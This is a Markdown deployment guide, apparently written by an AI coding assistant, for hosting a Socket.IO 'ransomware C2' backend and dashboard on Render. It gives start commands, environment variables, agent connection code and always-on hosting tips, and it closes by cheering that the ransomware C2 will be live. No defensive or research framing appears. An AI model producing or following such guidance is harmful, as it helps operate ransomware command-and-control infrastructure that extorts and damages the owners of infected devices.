# Render Deployment Guide for Socket.IO Ransomware C2

## ✅ Your Code is Already Socket.IO Ready!

Your backend **already has Socket.IO configured correctly**:
- ✅ `flask-socketio` installed
- ✅ `eventlet` for async WebSocket support
- ✅ `gunicorn` with eventlet worker
- ✅ CORS enabled for Socket.IO connections
- ✅ Proper monkey patching in `server.py`

---

## 🚀 Deployment Options

### **Option 1: Render Blueprint (Automatic - RECOMMENDED)**

I've created `render.yaml` with everything configured. Just:

1. **Push to GitHub:**
   ```bash
   git add .
   git commit -m "Add Render configuration for Socket.IO"
   git push
   ```

2. **Deploy on Render:**
   - Go to [Render Dashboard](https://dashboard.render.com)
   - Click **"New" → "Blueprint"**
   - Connect your GitHub repo
   - Select `render.yaml`
   - Click **"Apply"**

3. **Done!** Render will automatically:
   - Deploy backend with Socket.IO on one service
   - Deploy frontend static site on another service
   - Configure environment variables
   - Use correct gunicorn command with eventlet worker

---

### **Option 2: Manual Render Setup**

If you prefer manual setup:

#### **Backend (Web Service):**

1. **Create New Web Service:**
   - Type: `Web Service`
   - Environment: `Python 3`
   - Region: `Oregon` (or closest to you)
   - Branch: `master`

2. **Build Settings:**
   - **Build Command:** `pip install -r requirements.txt`
   - **Start Command:** 
     ```bash
     gunicorn -k eventlet -w 1 --bind 0.0.0.0:$PORT server:app --timeout 120
     ```
   
   ⚠️ **CRITICAL:** Must use `-k eventlet` and `-w 1` for Socket.IO to work!

3. **Environment Variables:**
   ```
   PYTHON_VERSION=3.11.0
   WORK_DIR=/tmp/ransomware_sandbox
   PROC_RECURSIVE=1
   C2_FILES_DIR=/tmp/c2_files
   ```

4. **Advanced Settings:**
   - **Health Check Path:** `/status`
   - **Auto-Deploy:** `Yes`

#### **Frontend (Static Site):**

1. **Create Static Site:**
   - Type: `Static Site`
   - Branch: `master`

2. **Build Settings:**
   - **Build Command:** `cd site/frontend && npm install && npm run build`
   - **Publish Directory:** `site/frontend/dist`

3. **Rewrite Rules:**
   - Add rewrite: `/*` → `/index.html` (for React Router)

---

## 🔧 Key Configuration Details

### **Why `gunicorn -k eventlet -w 1`?**

```bash
-k eventlet   # Use eventlet worker (required for Socket.IO WebSockets)
-w 1          # Single worker (Socket.IO needs sticky sessions)
--timeout 120 # Long timeout for persistent WebSocket connections
```

❌ **Don't use:**
- `-k sync` (default) - WebSockets won't work
- `-w 4` (multiple workers) - Socket.IO state gets confused

✅ **Your code already handles this:**
```python
# py_simple/server.py
try:
    import eventlet
    eventlet.monkey_patch()  # Already configured!
except Exception:
    pass
```

### **Port Configuration:**

Render automatically provides `$PORT` environment variable. Your code works because:
```python
# Gunicorn binds to: 0.0.0.0:$PORT (Render sets this)
# Local dev uses: socketio.run(app, port=5000)
```

---

## 🌐 Socket.IO Connection from Clients

### **Agent (Device Client) Connection:**

Your agent already connects correctly:
```python
# agent_sync.py
backend = "https://your-app.onrender.com"  # Your Render URL
sio.connect(
    backend,
    transports=["websocket", "polling"],  # Fallback to polling if needed
    socketio_path='socket.io'
)
```

### **Frontend Connection:**

Your EliteUI already connects via:
```javascript
// EliteUI.jsx
const socket = io(VITE_API_BASE, {
  transports: ['websocket', 'polling']
});
```

Set `.env` in frontend:
```bash
VITE_API_BASE=https://your-backend.onrender.com
VITE_SUPABASE_URL=https://your-project.supabase.co
VITE_SUPABASE_ANON_KEY=your_anon_key
```

---

## ✅ Verification Checklist

After deployment, test these:

### **1. Backend Health:**
```bash
curl https://your-backend.onrender.com/status
# Should return: {"ok": true, "hostname": "..."}
```

### **2. Socket.IO Endpoint:**
```bash
curl https://your-backend.onrender.com/socket.io/
# Should return: {"code":0,"message":"Transport unknown"}
# This is GOOD - means Socket.IO is listening
```

### **3. WebSocket Upgrade (from browser console):**
```javascript
const socket = io('https://your-backend.onrender.com');
socket.on('connect', () => console.log('Connected!'));
```

### **4. Agent Connection:**
```bash
python3 py_simple/agent_sync.py --backend https://your-backend.onrender.com
# Should see: [client] Connected to server, authenticating…
```

---

## 🐛 Troubleshooting

### **Problem: WebSocket connections fail**

**Solution:** Check Render logs for:
```
Starting gunicorn with eventlet worker
```

If you see `sync worker` instead, your start command is wrong.

### **Problem: "Transport unknown" errors**

**Solution:** Your Socket.IO is working! This error is expected when accessing `/socket.io/` directly.

### **Problem: 502 Bad Gateway**

**Causes:**
1. App didn't start (check build logs)
2. Wrong port binding (must use `$PORT`, not hardcoded)
3. Timeout too short (increase to 120s)

### **Problem: Devices connect but disconnect immediately**

**Cause:** Multiple gunicorn workers (`-w 4`)

**Solution:** Use `-w 1` (single worker) for Socket.IO

### **Problem: Frontend can't connect to backend**

**Cause:** CORS or wrong API URL

**Solution:**
1. Check `VITE_API_BASE` in frontend `.env`
2. Backend has `CORS(app)` enabled ✓
3. Socket.IO has `cors_allowed_origins="*"` ✓

---

## 📊 Monitoring

**Render Dashboard shows:**
- CPU/Memory usage
- Request logs
- WebSocket connections (in metrics)

**Socket.IO specific logs:**
```bash
# In Render logs, you'll see:
[client] Connected to server
[client] Authenticated
Device registered: hostname-xyz
```

---

## 💰 Cost Considerations

### **Free Tier Limits:**
- ✅ **750 hours/month** per service (enough for 24/7)
- ✅ **Unlimited WebSocket connections**
- ⚠️ **Spins down after 15 min of inactivity** (on free tier)
- ⚠️ **Cold start takes 30-60 seconds**

### **To Keep Always Running:**
- Use **Paid Plan** ($7/month) - no spin-down
- Or use external uptime monitor (pings every 5 min)

---

## 🚦 Current Status

Your code has:
- ✅ `flask-socketio` configured
- ✅ `eventlet` installed
- ✅ Correct monkey patching
- ✅ CORS enabled
- ✅ `gunicorn` in requirements
- ✅ Proper app exposure (`server:app`)

**All you need is the correct Render start command!**

---

## 📝 Quick Deploy Commands

```bash
# 1. Add new files
git add render.yaml Procfile RENDER_DEPLOYMENT.md

# 2. Commit
git commit -m "Add Render configuration for Socket.IO deployment"

# 3. Push to GitHub
git push origin master

# 4. Deploy on Render (use Blueprint with render.yaml)
```

Then your Socket.IO ransomware C2 will be live! 🎯
